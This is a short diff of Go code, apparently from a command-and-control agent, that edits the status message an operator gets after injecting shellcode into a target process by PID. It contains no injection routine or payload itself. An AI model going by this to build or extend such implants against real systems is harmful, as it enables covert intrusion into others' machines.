@@ -155,8 +155,7 @@ func processCCData(data *MsgTunData) {
 			if len(cmdSlice) != 3 {
 				goto send
 			}
-			out = fmt.Sprintf("%s has successfully injected shellcode into target process", cmdSlice[1]) +
-				"\nYour shellcode will run before target process exits"
+			out = fmt.Sprintf("%s has successfully injected shellcode into target process", cmdSlice[1])
 			pid, err := strconv.Atoi(cmdSlice[2])
 			if err != nil {
 				log.Print("Invalid pid")
